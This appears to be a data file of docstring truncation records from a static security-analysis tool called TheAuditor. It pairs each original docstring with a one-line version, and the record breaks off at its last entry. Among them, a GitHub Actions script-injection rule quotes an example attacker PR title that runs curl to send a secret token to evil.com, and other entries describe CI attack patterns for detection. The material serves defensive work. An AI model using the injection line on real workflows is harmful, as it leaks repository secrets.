    "original": "\"\"\"Extract Marshmallow schema definitions.\n\n    Detects:\n    - Schema class definitions (inherit from marshmallow.Schema or ma.Schema)\n    - Field count (validation surface area)\n    - Has nested schemas (ma.Nested references)\n    - Custom validators (@validates, @validates_schema decorators)\n\n    Security relevance:\n    - Schemas without validators = incomplete input validation\n    - Missing required fields = data integrity issues\n    - Nested schemas = complex validation chains (parity with Zod/Joi)\n    \"\"\"",
    "truncated": "\"\"\"Extract Marshmallow schema definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/validation_extractors.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract Marshmallow field definitions from schemas.\n\n    Detects:\n    - Field types (ma.String, ma.Integer, ma.Email, ma.Boolean, ma.Nested, etc.)\n    - required flag (required=True)\n    - allow_none flag (allow_none=True)\n    - Custom validators (validate= keyword)\n\n    Security relevance:\n    - Fields without required= validation = optional input bypass\n    - allow_none without validation = null pointer issues\n    - Missing validate= = incomplete validation (parity with Zod refinements)\n    \"\"\"",
    "truncated": "\"\"\"Extract Marshmallow field definitions from schemas.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract use declarations from Rust AST.\n\n    CRITICAL: NO REGEX - pure AST traversal.\n    This replaces the forbidden regex pattern from rust_lsp_backup.py.\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of ('use', import_path) tuples\n    \"\"\"",
    "truncated": "\"\"\"Extract use declarations from Rust AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract function calls with their arguments.\n\n    CRITICAL for taint analysis.\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n        function_params: Dict of function_name -> param_names\n\n    Returns:\n        List of call dicts with caller, callee, arguments\n    \"\"\"",
    "truncated": "\"\"\"Extract function calls with their arguments.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract control flow graph information.\n\n    Placeholder implementation - full CFG extraction is complex.\n    Returns basic control flow structure for now.\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of CFG dicts (basic structure)\n    \"\"\"",
    "truncated": "\"\"\"Extract control flow graph information.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Check if text is a valid Rust identifier.\n\n    Rust identifiers:\n    - Start with letter or underscore\n    - Contain only letters, digits, underscores\n    - Not just underscores\n\n    Args:\n        text: Text to validate\n\n    Returns:\n        True if valid identifier\n    \"\"\"",
    "truncated": "\"\"\"Check if text is a valid Rust identifier.\"\"\""
  },
  {
    "file": "theauditor/ast_parser.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Parse multiple files into ASTs in batch for performance.\n\n        This method dramatically improves performance for JavaScript/TypeScript projects\n        by processing multiple files in a single TypeScript compiler invocation.\n\n        Args:\n            file_paths: List of paths to source files\n            root_path: Absolute path to project root (for sandbox resolution)\n            jsx_mode: JSX extraction mode ('preserved' or 'transformed')\n\n        Returns:\n            Dictionary mapping file paths to their AST trees\n        \"\"\"",
    "truncated": "\"\"\"Parse multiple files into ASTs in batch for performance.\"\"\""
  },
  {
    "file": "theauditor/cache/__init__.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"TheAuditor Cache Package.\n\nThis package provides unified caching infrastructure for all TheAuditor components.\nIt includes:\n- Unified cache manager with plugin architecture\n- AST caching for parsed syntax trees\n- Pattern caching with version hashing\n- Graph caching with incremental updates\n- CFG caching for taint analysis\n\nThe unified architecture reduces analysis time from 30+ minutes to <8 minutes\non cached runs while maintaining correctness through intelligent invalidation.\n\"\"\"",
    "truncated": "\"\"\"TheAuditor Cache Package.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Detect dead code using graph-based analysis.\n\n    This is the backward-compatible wrapper for the old deadcode.py API.\n    Internally uses GraphDeadCodeDetector for accurate graph reachability.\n\n    Args:\n        db_path: Path to repo_index.db\n        path_filter: Optional LIKE pattern\n        exclude_patterns: Paths to skip\n\n    Returns:\n        List of DeadCode findings\n    \"\"\"",
    "truncated": "\"\"\"Detect dead code using graph-based analysis.\"\"\""
  },
  {
    "file": "theauditor/context/formatters.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Format query results in specified format.\n\n    Args:\n        results: Query results (varies by query type)\n        format: 'text', 'json', or 'tree'\n\n    Returns:\n        Formatted string ready for output\n\n    Example:\n        text = format_output(symbols, format='text')\n        print(text)\n    \"\"\"",
    "truncated": "\"\"\"Format query results in specified format.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Read npm dependencies from package_configs table.\n\n    Args:\n        db_path: Path to repo_index.db\n        root: Project root path\n        debug: Debug mode flag\n\n    Returns:\n        List of dependency dictionaries in deps.py format\n\n    Raises:\n        sqlite3.Error: On unexpected database errors (not missing tables)\n    \"\"\"",
    "truncated": "\"\"\"Read npm dependencies from package_configs table.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Read Python dependencies from python_package_configs table.\n\n    Args:\n        db_path: Path to repo_index.db\n        root: Project root path\n        debug: Debug mode flag\n\n    Returns:\n        List of dependency dictionaries in deps.py format\n\n    Raises:\n        sqlite3.Error: On unexpected database errors (not missing tables)\n    \"\"\"",
    "truncated": "\"\"\"Read Python dependencies from python_package_configs table.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\n    Clean version specification to get actual version.\n    Handles Python (PEP 440) and npm (semver) operators.\n\n    Examples:\n    ^1.2.3 -> 1.2.3 (npm caret)\n    ~1.2.3 -> 1.2.3 (npm/Python tilde)\n    >=1.2.3 -> 1.2.3 (greater or equal)\n    ==1.2.3 -> 1.2.3 (Python exact)\n    !=1.2.3 -> 1.2.3 (Python not equal)\n    ~=1.2.3 -> 1.2.3 (Python compatible)\n    ===1.2.3 -> 1.2.3 (Python arbitrary)\n    \"\"\"",
    "truncated": "\"\"\"Clean version specification to get actual version.\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\n        Identify hotspot nodes based on connectivity (in/out degree).\n\n        Pure graph algorithm that identifies most connected nodes\n        without interpretation or scoring.\n\n        Args:\n            graph: Graph with 'nodes' and 'edges'\n            top_n: Number of top hotspots to return\n\n        Returns:\n            List of hotspot nodes with their degree counts\n        \"\"\"",
    "truncated": "\"\"\"Identify hotspot nodes based on connectivity (in/out degree).\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\n        Analyze impact of changes to target nodes.\n\n        Wrapper method for impact_of_change to match expected API.\n\n        Args:\n            graph: Graph with 'nodes' and 'edges'\n            targets: List of target node IDs\n            max_depth: Maximum traversal depth\n\n        Returns:\n            Impact analysis results with upstream/downstream effects\n        \"\"\"",
    "truncated": "\"\"\"Analyze impact of changes to target nodes.\"\"\""
  },
  {
    "file": "theauditor/graph/builder.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Get basic metrics for a file from manifest/database.\n\n        DATABASE-FIRST ARCHITECTURE: Graph builder READS metrics pre-computed by Indexer.\n        NO FILESYSTEM ACCESS (no file I/O, no subprocess calls).\n        NO SUBPROCESS CALLS (no git commands in production code).\n\n        Separation of concerns:\n        - Indexer (aud full): WRITES metrics (LOC, churn) to database\n        - Builder (aud graph build): READS metrics from database/manifest\n\n        If metrics missing from manifest, return defaults.\n        Indexer will populate on next run.\n        \"\"\"",
    "truncated": "\"\"\"Get basic metrics for a file from manifest/database.\"\"\""
  },
  {
    "file": "theauditor/graph/dfg_builder.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Get all variables that flow into the given variable.\n\n        Performs a backwards traversal from the target variable to find all\n        source variables in its data dependency chain.\n\n        Args:\n            file: File path\n            variable: Variable name\n            function: Function scope (None for global)\n\n        Returns:\n            Dict with dependencies and flow paths\n        \"\"\"",
    "truncated": "\"\"\"Get all variables that flow into the given variable.\"\"\""
  },
  {
    "file": "theauditor/graph/dfg_builder.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Data Flow Graph Builder - constructs variable data flow graphs.\n\nThis module builds data flow graphs from normalized assignment and return data\nstored in the database. It tracks how data flows between variables through\nassignments and function returns.\n\nArchitecture:\n- Database-first: NO fallbacks, NO JSON parsing\n- Reads from normalized junction tables (assignment_sources, function_return_sources)\n- Returns same format as builder.py (dataclass -> asdict)\n- Zero tolerance for missing data - hard fail exposes bugs\n- Strategy Pattern: Language-specific logic delegated to strategies/\n\"\"\"",
    "truncated": "\"\"\"Data Flow Graph Builder - constructs variable data flow graphs.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/node_express.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Build edges for Express middleware and controllers.\n\n        Combines results from:\n        - _build_middleware_edges()\n        - _build_controller_edges()\n\n        Args:\n            db_path: Path to repo_index.db\n            project_root: Project root for metadata\n\n        Returns:\n            Dict with merged nodes, edges, metadata\n        \"\"\"",
    "truncated": "\"\"\"Build edges for Express middleware and controllers.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/node_orm.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Infer field name from association type.\n\n        hasMany(Post) -> 'posts' (pluralized)\n        belongsTo(User) -> 'user' (singular lowercase)\n        hasOne(Profile) -> 'profile' (singular lowercase)\n\n        Args:\n            assoc_type: Association type (hasMany, belongsTo, hasOne, belongsToMany)\n            target_model: Target model name\n\n        Returns:\n            Inferred alias for the relationship field\n        \"\"\"",
    "truncated": "\"\"\"Infer field name from association type.\"\"\""
  },
  {
    "file": "theauditor/graph/types.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Shared data structures for the graph module.\n\nThis module contains the core data types used by:\n- DFGBuilder (the orchestrator)\n- All GraphStrategy implementations (Python ORM, Node Express, etc.)\n\nExtracted to prevent circular imports when strategies need to create nodes/edges.\n\nArchitecture:\n- DFGNode: Represents a variable in the data flow graph\n- DFGEdge: Represents a data flow edge between variables\n- create_bidirectional_edges: Helper to create forward + reverse edges\n\"\"\"",
    "truncated": "\"\"\"Shared data structures for the graph module.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Add a variable assignment record to the batch.\n\n        ARCHITECTURE: Normalized many-to-many relationship.\n        - Phase 1: Batch assignment record (without source_vars column)\n        - Phase 2: Batch junction records for each source variable\n\n        Args:\n            property_path: Full property path for destructured assignments (e.g., 'req.params.id')\n                          NULL for non-destructured assignments (e.g., 'const x = y')\n            col: Column position (required for minified files where multiple assignments on same line)\n\n        NO FALLBACKS. If source_vars is malformed, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add a variable assignment record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Add a CDK security finding record to the batch.\n\n        Args:\n            finding_id: Unique finding identifier\n            file_path: Path to CDK file with issue\n            construct_id: Optional FK to cdk_constructs (nullable for file-level findings)\n            category: Finding category (e.g., 'public_exposure', 'missing_encryption')\n            severity: Severity level ('critical', 'high', 'medium', 'low')\n            title: Short finding title\n            description: Detailed finding description\n            remediation: Suggested fix\n            line: Line number of issue\n        \"\"\"",
    "truncated": "\"\"\"Add a CDK security finding record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Add a frontend API call record to the batch.\n\n        Tracks fetch() and axios calls from frontend code to backend APIs.\n        Used for cross-boundary taint flow analysis (frontend -> backend).\n\n        Args:\n            file: Frontend file making the API call\n            line: Line number of the call\n            method: HTTP method (GET, POST, PUT, DELETE, PATCH)\n            url_literal: Static API path (e.g., '/api/users')\n            body_variable: Variable name sent as body (e.g., 'userData')\n            function_name: Function containing the API call\n        \"\"\"",
    "truncated": "\"\"\"Add a frontend API call record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/planning_database.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Add a refactor candidate record to the batch.\n\n        Args:\n            file_path: Path to file flagged for refactoring\n            reason: Why file needs refactoring (complexity, duplication, size, coupling)\n            severity: Severity level (low, medium, high, critical)\n            detected_at: ISO timestamp when detected\n            loc: Lines of code (optional)\n            cyclomatic_complexity: McCabe complexity score (optional)\n            duplication_percent: Percentage of duplicated code (optional)\n            num_dependencies: Number of dependencies/imports (optional)\n            metadata_json: Additional metadata as JSON string\n        \"\"\"",
    "truncated": "\"\"\"Add a refactor candidate record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Add a Python loop (for/while/async for/complexity) to the batch.\n\n        Args:\n            loop_kind: 'for', 'while', 'async_for', 'complexity_analysis' (discriminator)\n            loop_type: Extractor's subtype (e.g., 'enumerate', 'zip') - NOT overwritten\n            has_else: Whether loop has else clause\n            nesting_level: Depth of loop nesting\n            target_count: Number of loop variables (for/async_for)\n            in_function: Name of containing function\n            is_infinite: Whether loop is infinite (while only)\n            estimated_complexity: Big-O complexity (complexity_analysis only)\n            has_growing_operation: Whether loop has growing operation (complexity_analysis only)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python loop (for/while/async for/complexity) to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Add a Python protocol - returns row ID for junction table FK.\n\n        CRITICAL: Uses direct cursor.execute() to return lastrowid for junction FK.\n        DO NOT USE BATCHING - junction tables need parent ID.\n\n        Args:\n            protocol_kind: 'iterator', 'container', 'callable', 'comparison',\n                          'arithmetic', 'pickle', 'context_manager', 'copy'\n            protocol_type: Preserved subtype from extractor\n\n        Returns:\n            int: Row ID of inserted protocol (for python_protocol_methods FK)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python protocol - returns row ID for junction table FK.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Add a Python validation schema - returns row ID for junction table FK.\n\n        CRITICAL: Uses direct cursor.execute() to return lastrowid for junction FK.\n        DO NOT USE BATCHING - junction tables need parent ID.\n\n        Args:\n            schema_kind: Discriminator: 'schema', 'field', 'serializer', 'form'\n            schema_type: Extractor's subtype (preserved)\n            framework: 'marshmallow', 'drf', 'wtforms'\n\n        Returns:\n            int: Row ID of inserted schema (for python_schema_validators FK)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python validation schema - returns row ID for junction table FK.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Add a Python comprehension to the batch.\n\n        Args:\n            comp_kind: 'list', 'dict', 'set', 'generator' (discriminator)\n            comp_type: Extractor's subtype (preserved, not overwritten)\n            iteration_var: The loop variable name\n            iteration_source: The iterable expression\n            result_expr: The expression that produces each element\n            filter_expr: The filter condition (if any)\n            has_filter: Whether comprehension has an 'if' clause\n            nesting_level: Depth of nested comprehensions\n            in_function: Name of containing function\n        \"\"\"",
    "truncated": "\"\"\"Add a Python comprehension to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/docker.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract facts from Dockerfile directly to database.\n\n        Uses external dockerfile-parse library for parsing.\n        Extracts to docker_images table via self.db_manager.\n\n        Args:\n            file_info: File metadata dictionary\n            content: File content\n            tree: Optional pre-parsed AST tree (not used for Docker)\n\n        Returns:\n            Minimal dict for indexer compatibility\n        \"\"\"",
    "truncated": "\"\"\"Extract facts from Dockerfile directly to database.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/github_actions.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract GitHub Actions workflow directly to database.\n\n        Uses inline YAML parsing (like generic.py for Docker Compose).\n        Writes directly to database via self.db_manager.add_github_* methods.\n\n        Args:\n            file_info: File metadata dictionary with 'path' key\n            content: YAML content as string\n            tree: Optional pre-parsed AST tree (unused for YAML)\n\n        Returns:\n            Minimal dict for indexer compatibility\n        \"\"\"",
    "truncated": "\"\"\"Extract GitHub Actions workflow directly to database.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/prisma.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract Prisma models directly to database.\n\n        Parses schema.prisma content inline (regex-based).\n        Writes to prisma_models table via self.db_manager.\n\n        Args:\n            file_info: File metadata dictionary\n            content: File content\n            tree: Optional pre-parsed AST tree (not used for Prisma)\n\n        Returns:\n            Minimal dict for indexer compatibility\n        \"\"\"",
    "truncated": "\"\"\"Extract Prisma models directly to database.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/python.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract imports from Python AST.\n\n        Uses Python's ast module to accurately extract import statements,\n        avoiding false matches in comments, strings, or docstrings.\n\n        Args:\n            tree: Parsed AST tree dictionary\n\n        Returns:\n            List of (kind, module, line_number) tuples:\n            - ('import', 'os', 15)\n            - ('from', 'pathlib', 23)\n        \"\"\"",
    "truncated": "\"\"\"Extract imports from Python AST.\"\"\""
  },
  {
    "file": "theauditor/indexer/metadata_collector.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Parse Python or Node.js coverage reports into pure facts.\n\n        Detects format automatically:\n        - Python: coverage.json from coverage.py with 'files' key\n        - Node.js: coverage-final.json from Istanbul/nyc\n\n        Args:\n            coverage_file: Path to coverage file (auto-detects if not provided)\n            output_path: Optional path to save JSON output\n\n        Returns:\n            Dictionary with coverage facts per file\n        \"\"\"",
    "truncated": "\"\"\"Parse Python or Node.js coverage reports into pure facts.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/planning_schema.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\nPlanning and meta-system schema definitions.\n\nThis module contains table schemas for TheAuditor's planning system:\n- Plans and tasks (aud planning commands)\n- Specs and verification\n- Code snapshots and diffs (change tracking)\n\nDesign Philosophy:\n- Meta-system tables (not code analysis)\n- Planning workflow support\n- Change history tracking\n\"\"\"",
    "truncated": "\"\"\"Planning and meta-system schema definitions.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/utils.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\nSchema utility classes - Foundation for all schema definitions.\n\nThis module contains the core class definitions used by ALL schema modules:\n- Column: Represents a database column with type and constraints\n- ForeignKey: Foreign key relationship metadata for JOIN query generation\n- TableSchema: Complete table schema definition\n\nDesign Philosophy:\n- Zero dependencies on table definitions (avoids circular imports)\n- Used by all language-specific schema modules\n- Pure class definitions only (no table registries)\n\"\"\"",
    "truncated": "\"\"\"Schema utility classes - Foundation for all schema definitions.\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\n        Rank nodes by their importance as hotspots using weighted scoring.\n\n        This is an INTERPRETIVE method that assigns subjective importance\n        scores based on configurable weights.\n\n        Args:\n            import_graph: Import/dependency graph\n            call_graph: Optional call graph for additional signals\n\n        Returns:\n            List of hotspot nodes sorted by interpreted score\n        \"\"\"",
    "truncated": "\"\"\"Rank nodes by their importance as hotspots using weighted scoring.\"\"\""
  },
  {
    "file": "theauditor/insights/impact_analyzer.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"\n    Calculate transitive dependencies up to max_depth.\n\n    Args:\n        cursor: Database cursor\n        direct_deps: Direct dependencies to expand\n        direction: \"upstream\" or \"downstream\"\n        max_depth: Maximum recursion depth\n        visited: Set of already visited (file, symbol) pairs\n\n    Returns:\n        List of transitive dependencies\n    \"\"\"",
    "truncated": "\"\"\"Calculate transitive dependencies up to max_depth.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Check if a file path is in this pattern's scope.\n\n        Scope rules:\n        1. If no scope defined, all files are in scope\n        2. Excludes are checked first (higher priority)\n        3. If includes are defined, file must match at least one\n\n        Args:\n            file_path: Path to check\n\n        Returns:\n            True if file is in scope\n        \"\"\"",
    "truncated": "\"\"\"Check if a file path is in this pattern's scope.\"\"\""
  },
  {
    "file": "theauditor/js_semantic_parser.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Get semantic AST for a JavaScript/TypeScript file.\n\n    This is a convenience function that creates or reuses a cached parser instance\n    and calls its get_semantic_ast method.\n\n    Args:\n        file_path: Path to the JavaScript or TypeScript file to parse\n        project_root: Absolute path to project root. If not provided, uses current directory.\n        jsx_mode: JSX parsing mode ('preserved' or 'transformed')\n\n    Returns:\n        Dictionary containing the semantic AST and metadata\n    \"\"\"",
    "truncated": "\"\"\"Get semantic AST for a JavaScript/TypeScript file.\"\"\""
  },
  {
    "file": "theauditor/pipelines.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Execute subprocess using asyncio memory pipes (no temp files).\n\n    This is the modern replacement for run_subprocess_with_interrupt().\n    Uses memory pipes instead of disk I/O for 10-100x faster IPC.\n\n    Args:\n        cmd: Command array to execute\n        cwd: Working directory\n        timeout: Maximum execution time in seconds\n\n    Returns:\n        PhaseResult with status, stdout, stderr, elapsed\n    \"\"\"",
    "truncated": "\"\"\"Execute subprocess using asyncio memory pipes (no temp files).\"\"\""
  },
  {
    "file": "theauditor/pipelines.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Query findings_consolidated for severity counts.\n\n    ZERO FALLBACK: No try/except. If DB query fails, pipeline crashes.\n    This exposes bugs instead of hiding them with false \"[CLEAN]\" status.\n\n    Args:\n        root: Project root path containing .pf/ directory\n\n    Returns:\n        Dict with critical, high, medium, low, total_vulnerabilities counts.\n        Only counts SECURITY_TOOLS (patterns, taint, terraform, cdk).\n        Quality tools (ruff, eslint, mypy) are excluded from security status.\n    \"\"\"",
    "truncated": "\"\"\"Query findings_consolidated for severity counts.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Add a phase to a plan (hierarchical planning structure).\n\n        Args:\n            plan_id: ID of plan\n            phase_number: Phase number within plan\n            title: Phase title (required)\n            description: Phase description\n            success_criteria: What completion looks like for this phase (criteria)\n            status: Phase status (pending|in_progress|completed)\n            created_at: Creation timestamp (auto-generated if empty)\n\n        NO FALLBACKS. Raises sqlite3.IntegrityError if duplicate phase_number.\n        \"\"\"",
    "truncated": "\"\"\"Add a phase to a plan (hierarchical planning structure).\"\"\""
  },
  {
    "file": "theauditor/planning/shadow_git.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Get diff statistics between two snapshots.\n\n        Args:\n            old_sha: SHA of older commit (None for first commit)\n            new_sha: SHA of newer commit\n\n        Returns:\n            dict with:\n                - files_changed: Number of files changed\n                - insertions: Lines added\n                - deletions: Lines removed\n                - files: List of changed file paths\n        \"\"\"",
    "truncated": "\"\"\"Get diff statistics between two snapshots.\"\"\""
  },
  {
    "file": "theauditor/rules/base.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Safely extract AST with optional type checking.\n\n        Args:\n            expected_type: If provided, only return AST if type matches\n\n        Returns:\n            The AST tree object or None if not available/wrong type\n\n        Example:\n            tree = context.get_ast(\"python_ast\")\n            if tree:\n                # Work with Python AST\n        \"\"\"",
    "truncated": "\"\"\"Safely extract AST with optional type checking.\"\"\""
  },
  {
    "file": "theauditor/rules/base.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Metadata describing rule requirements for smart orchestrator filtering.\n\n    Added in Phase 3B to enable intelligent file targeting and skip irrelevant files.\n\n    Usage in rules:\n        METADATA = RuleMetadata(\n            name=\"sql_injection\",\n            category=\"sql\",\n            target_extensions=['.py', '.js'],\n            exclude_patterns=['migrations/'],\n            requires_jsx_pass=False\n        )\n    \"\"\"",
    "truncated": "\"\"\"Metadata describing rule requirements for smart orchestrator filtering.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/ghost_dependencies.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Detect packages imported in code but not declared in package files.\n\n    Args:\n        context: Rule execution context with db_path\n\n    Returns:\n        List of findings for ghost dependencies\n\n    Known Limitations:\n    - Cannot detect monorepo workspace dependencies\n    - May flag dev dependencies that are intentionally omitted\n    - Requires accurate import extraction from indexer\n    \"\"\"",
    "truncated": "\"\"\"Detect packages imported in code but not declared in package files.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/excessive_permissions.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Detect excessive write permissions in untrusted workflows.\n\n    Detection Logic:\n    1. Find workflows with untrusted triggers (pull_request_target, etc.)\n    2. Check jobs for dangerous write permissions\n    3. Report findings for each risky permission grant\n\n    Args:\n        context: Rule execution context with database path\n\n    Returns:\n        List of security findings\n    \"\"\"",
    "truncated": "\"\"\"Detect excessive write permissions in untrusted workflows.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/excessive_permissions.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"GitHub Actions Excessive Permissions Detection.\n\nDetects overly permissive workflows that grant write access in untrusted contexts\nlike pull_request_target or issue_comment triggers, allowing PRs to modify repo\ncontent, publish packages, or mint OIDC tokens.\n\nAttack Pattern:\n1. Workflow triggered by pull_request_target or issue_comment (untrusted)\n2. Job has write permissions (contents, packages, id-token)\n3. Attacker PR can push commits, publish packages, create releases, etc.\n\nCWE-269: Improper Privilege Management\n\"\"\"",
    "truncated": "\"\"\"GitHub Actions Excessive Permissions Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/script_injection.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"GitHub Actions Script Injection Detection.\n\nDetects command injection vulnerabilities where untrusted PR data (titles, body,\ncommit messages, branch names) is directly interpolated into shell scripts without\nproper sanitization.\n\nAttack Pattern:\n1. Workflow uses github.event.pull_request.* or github.event.issue.* in run: script\n2. Data not passed through environment variables (unsafe interpolation)\n3. Attacker crafts PR title like: \"; curl http://evil.com/steal?token=$SECRET\"\n\nCWE-77: Improper Neutralization of Special Elements used in a Command\n\"\"\"",
    "truncated": "\"\"\"GitHub Actions Script Injection Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/unpinned_actions.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Build finding for unpinned action vulnerability.\n\n    Args:\n        workflow_path: Path to workflow file\n        job_key: Job key\n        step_name: Step display name\n        uses_action: Action reference (org/repo)\n        uses_version: Mutable version tag\n        secret_refs: List of secret reference paths\n\n    Returns:\n        StandardFinding object\n    \"\"\"",
    "truncated": "\"\"\"Build finding for unpinned action vulnerability.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/untrusted_checkout.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"GitHub Actions Untrusted Checkout Sequence Detection.\n\nDetects the critical vulnerability where pull_request_target workflows check out\nuntrusted PR code before any validation, allowing attacker code execution with\nwrite permissions and access to repository secrets.\n\nAttack Pattern:\n1. Workflow triggers on pull_request_target (runs in target repo context)\n2. Early checkout step uses github.event.pull_request.head.sha (attacker code)\n3. Attacker code executes with GITHUB_TOKEN write permissions\n\nCWE-284: Improper Access Control\n\"\"\"",
    "truncated": "\"\"\"GitHub Actions Untrusted Checkout Sequence Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/node/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Extract base object from function call.\n\n        Examples:\n            'fs.existsSync' → 'fs'\n            'user.save' → 'user'\n            'save' → '' (no object)\n\n        Args:\n            callee_function: Function call string\n\n        Returns:\n            Base object name or empty string\n        \"\"\"",
    "truncated": "\"\"\"Extract base object from function call.\"\"\""
  },
  {
    "file": "theauditor/rules/security/rate_limit_analyze.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Rate Limit Analyzer - Production-Ready Database-Driven Detection.\n\nDetects 15+ rate limiting misconfigurations and bypass techniques using pure SQL queries.\nFollows gold standard patterns (v1.1+ schema contract compliance).\n\nThis implementation:\n- Uses frozensets for O(1) pattern matching (immutable, hashable)\n- Direct database queries (assumes all tables exist per schema contract)\n- Uses parameterized queries (no SQL injection)\n- Implements multi-layer detection patterns\n- Provides confidence scoring based on context\n- Maps findings to security regulations (OWASP, PCI-DSS, NIST)\n\"\"\"",
    "truncated": "\"\"\"Rate Limit Analyzer - Production-Ready Database-Driven Detection.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_injection_analyze.py",
    "line": -1,
    "original_lines": 13,
    "original": "\"\"\"Check for dynamic SQL query construction patterns.\n\n    Specifically looks for:\n    - String concatenation to build SQL\n    - Format strings with SQL keywords\n    - Template literals with SQL content\n\n    Args:\n        context: Rule execution context\n\n    Returns:\n        List of findings for dynamic query construction\n    \"\"\"",
    "truncated": "\"\"\"Check for dynamic SQL query construction patterns.\"\"\""
  },
  {
    "file": "theauditor/sandbox_executor.py",
    "line": -1,
    "original_lines": 13,
